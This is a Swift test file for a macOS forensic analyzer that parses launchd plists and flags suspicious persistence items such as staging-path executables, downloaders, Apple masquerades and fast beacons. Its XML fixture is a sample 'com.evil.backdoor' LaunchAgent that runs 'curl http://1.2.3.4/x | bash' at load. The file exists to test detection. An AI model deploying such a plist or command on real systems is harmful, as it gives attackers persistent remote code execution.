//
//  MacPersistenceTests.swift
//  StrataTests
//
//  Covers the macOS launchd layer: LaunchItemParser (XML + binary plists, scope
//  derivation) and MacPersistenceAnalyzer's launch-item detection rules.
//

import Testing
import Foundation
@testable import Strata

struct MacPersistenceTests {

    // MARK: - Parser: XML plist

    private static let xmlPlist = """
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.evil.backdoor</string>
        <key>ProgramArguments</key>
        <array>
            <string>/bin/bash</string>
            <string>-c</string>
            <string>curl http://1.2.3.4/x | bash</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>StartInterval</key>
        <integer>60</integer>
        <key>WatchPaths</key>
        <array>
            <string>/Users/alice/.config</string>
        </array>
    </dict>
    </plist>
    """

    @Test func parsesXmlPlist() throws {
        let data = try #require(Self.xmlPlist.data(using: .utf8))
        let entry = try #require(LaunchItemParser.parse(
            data: data, plistPath: "/Users/alice/Library/LaunchAgents/com.evil.backdoor.plist"))

        #expect(entry.label == "com.evil.backdoor")
        #expect(entry.programArguments == ["/bin/bash", "-c", "curl http://1.2.3.4/x | bash"])
        #expect(entry.program == nil)
        #expect(entry.executable == "/bin/bash")
        #expect(entry.runAtLoad)
        #expect(entry.startInterval == 60)
        #expect(entry.watchPaths == ["/Users/alice/.config"])
        #expect(entry.scope == .userAgent)
    }

    // MARK: - Parser: binary plist

    @Test func parsesBinaryPlist() throws {
        let dict: [String: Any] = [
            "Label": "com.apple.softwareupdate",
            "Program": "/usr/libexec/softwareupdated",
            "RunAtLoad": true,
            "StartInterval": 3600,
        ]
        let data = try PropertyListSerialization.data(
            fromPropertyList: dict, format: .binary, options: 0)

        let entry = try #require(LaunchItemParser.parse(
            data: data, plistPath: "/Library/LaunchDaemons/com.apple.softwareupdate.plist"))

        #expect(entry.label == "com.apple.softwareupdate")
        #expect(entry.program == "/usr/libexec/softwareupdated")
        #expect(entry.executable == "/usr/libexec/softwareupdated")
        #expect(entry.runAtLoad)
        #expect(entry.startInterval == 3600)
        #expect(entry.scope == .systemDaemon)
    }

    // MARK: - Parser: scope derivation + fallbacks

    @Test func derivesScopeFromPath() {
        #expect(LaunchItemParser.scope(for: "/Library/LaunchDaemons/x.plist") == .systemDaemon)
        #expect(LaunchItemParser.scope(for: "/Library/LaunchAgents/x.plist") == .systemAgent)
        #expect(LaunchItemParser.scope(for: "/Users/bob/Library/LaunchAgents/x.plist") == .userAgent)
        #expect(LaunchItemParser.scope(for: "/private/var/root/Library/LaunchAgents/x.plist") == .userAgent)
    }

    @Test func fallsBackToBasenameWhenLabelMissing() throws {
        let dict: [String: Any] = ["Program": "/usr/bin/true"]
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        let entry = try #require(LaunchItemParser.parse(
            data: data, plistPath: "/Library/LaunchDaemons/no.label.here.plist"))
        #expect(entry.label == "no.label.here.plist")
    }

    @Test func returnsNilForNonDictionaryData() {
        let garbage = Data([0x00, 0x01, 0x02, 0x03])
        #expect(LaunchItemParser.parse(data: garbage, plistPath: "/x.plist") == nil)
    }

    // MARK: - Analyzer helpers

    private func item(label: String = "com.example.job",
                      program: String? = nil,
                      args: [String] = [],
                      runAtLoad: Bool = false,
                      startInterval: Int? = nil,
                      scope: LaunchItemEntry.Scope = .userAgent,
                      plistPath: String = "/Users/alice/Library/LaunchAgents/com.example.job.plist")
    -> LaunchItemEntry {
        LaunchItemEntry(label: label, program: program, programArguments: args,
                        runAtLoad: runAtLoad, startInterval: startInterval,
                        scope: scope, plistPath: plistPath)
    }

    // MARK: - Analyzer: detection rules

    @Test func flagsStagingPathExecutable() throws {
        let it = item(program: "/tmp/.hidden/payload",
                      scope: .systemDaemon,
                      plistPath: "/Library/LaunchDaemons/com.x.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        let f = try #require(findings.first)
        #expect(f.severity == .high)
        #expect(f.phase == .installation)
        #expect(f.technique?.attackID == "T1543.004")
        #expect(f.evidencePaths == ["/Library/LaunchDaemons/com.x.plist"])
    }

    @Test func flagsRunAtLoadDownloader() throws {
        let it = item(program: "/opt/homebrew/bin/curl", runAtLoad: true,
                      scope: .systemAgent,
                      plistPath: "/Library/LaunchAgents/com.x.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        let f = try #require(findings.first)
        #expect(f.severity == .high)
        #expect(f.technique?.attackID == "T1543.001")
    }

    @Test func flagsShellDashCInline() throws {
        let it = item(args: ["/bin/zsh", "-c", "echo hi"], scope: .systemAgent,
                      plistPath: "/Library/LaunchAgents/com.x.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        let f = try #require(findings.first)
        #expect(f.severity == .high)
        #expect(f.detail.contains("-c"))
    }

    @Test func flagsAppleMasquerade() throws {
        let it = item(label: "com.apple.updater",
                      program: "/Users/alice/.cache/updater",
                      plistPath: "/Users/alice/Library/LaunchAgents/com.apple.updater.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        let f = try #require(findings.first)
        #expect(f.severity == .high)
        #expect(f.detail.lowercased().contains("masquerade"))
    }

    @Test func flagsFastBeaconAsMedium() throws {
        // A legitimate-looking system path but a 30s interval → medium beacon.
        let it = item(program: "/usr/local/bin/agent", startInterval: 30,
                      scope: .systemAgent, plistPath: "/Library/LaunchAgents/com.x.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        let f = try #require(findings.first)
        #expect(f.severity == .medium)
        #expect(f.detail.contains("30s"))
    }

    @Test func ignoresBenignAppleSystemJob() {
        let it = item(label: "com.apple.softwareupdate",
                      program: "/usr/libexec/softwareupdated",
                      runAtLoad: true, startInterval: 86400,
                      scope: .systemDaemon,
                      plistPath: "/Library/LaunchDaemons/com.apple.softwareupdate.plist")
        let findings = MacPersistenceAnalyzer().analyze([it])
        #expect(findings.isEmpty)
    }

    @Test func contextShimReturnsEmpty() {
        let ctx = AnalysisContext(files: [], events: [], timeline: [], registryValues: [])
        #expect(MacPersistenceAnalyzer().analyze(context: ctx).isEmpty)
    }
}
